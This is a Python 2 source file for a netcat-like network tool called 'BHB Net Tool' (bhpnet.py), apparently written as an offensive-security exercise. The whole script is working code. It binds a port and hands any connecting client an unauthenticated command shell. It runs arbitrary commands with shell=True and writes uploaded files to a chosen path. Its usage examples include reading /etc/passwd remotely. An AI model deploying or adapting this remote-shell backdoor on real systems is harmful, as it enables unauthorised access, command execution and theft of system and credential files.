#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

#define the global variable
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

#how to use
def usage():
    print "BHB Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen              - listen on [host]:[port] for"
    print "                           incoming connections"
    print "-e --execute=file_to_run - execute the given file upon"
    print "                           receiving a connection"
    print "-c --command             - initialize a command shell"
    print "-u --upload=destination  - upon receiving connectino upload a"
    print "                           file and write to [destination]"
    print 
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e \"cat /etc/passwd\""
    print "echo 'ABCDEF' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)
    
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    #road commandline option
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "hle:t:p:cu:",
            ["help", "listen", "execute=", "target=",
             "port=", "command", "upload="])
        #opts: ['-option or --option',value]
        #args: [remain_arg1,remain_arg2,...]
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
        
    for o,a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
            
    if (not listen) and len(target) and (port > 0):
     
        #store input from commandline in 'buffer'
        #if no input, process cannot continue
        #enter Ctrl-D in case of enter no data to stdin
        buffer = sys.stdin.read()
    
        #send data
        client_sender(buffer)
            
    if listen:
        server_loop()
            



#make tcp client and start  
def client_sender(buffer):
    global target
    global port
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        #connect to target host
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
            
        while True:
            #wait data from target host
            recv_len = 1
            response = ""
            
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
                
            print response,
            
            #wait additional input
            
            buffer = raw_input("")
            buffer += "\n"
            
            #send data
            client.send(buffer)
            
            
    except:
        print "[*] Exceptinon! Exiting."
        
        #close connect
        client.close()
        
def server_loop():
    global target
    
    #if the ip addr that server waits for is not specified
    #wait for all interface 
    
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    server.bind((target, port))
    
    server.listen(5)
    
    print "server listening..."
    
    while True:
        client_socket, addr = server.accept()
        #addr is a tuple that (ip addr, port number)
        
        #boot thread that handle new connect from client
        client_thread = threading.Thread(target=client_handler,
                                         args=(client_socket,))
        client_thread.start()
        
def run_command(command):
    #delete string of "\n" on tail of strings
    command = command.rstrip()
    
    #run the command and get result
    try:
        output = subprocess.check_output(command,
                                         stderr=subprocess.STDOUT, 
                                         shell=True)
    except:
        output = "Failed to execute command.\r\n"
        
    #send result to client
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command
    
    #check whether file upload is specified
    if len(upload_destination):
        
        #read all datas and write data on specified file
        file_buffer = ""
        
        #continue recieving datas until data is gone
        while True:
            data = client_socket.recv(1024)
            
            if len(data) == 0:
                break
            else:
                file_buffer += data
                
        #write recieved datas on file
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            # notify whether writing on file success or not
            client_socket.send("Successfully saved file to %s\r\n"
                               % upload_destination)
        except:
            client_socket.send("Failed to seve file to %s\r\n")
            
    # check if running command is specified
    if len(execute):
        
        # run commands
        output = run_command(execute)
        
        client_socket.send(output)
        
    # processing in case running command shell is specified
    if command:
        
        # show prompt
        prompt = "<BHP:#> "
        client_socket.send(prompt)
        
        while True:
            
            #recieve datas until recieve string of "\n"
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            # get result of running command
            response = run_command(cmd_buffer)
            response += prompt
            
            # send result of running command
            client_socket.send(response)
            

main()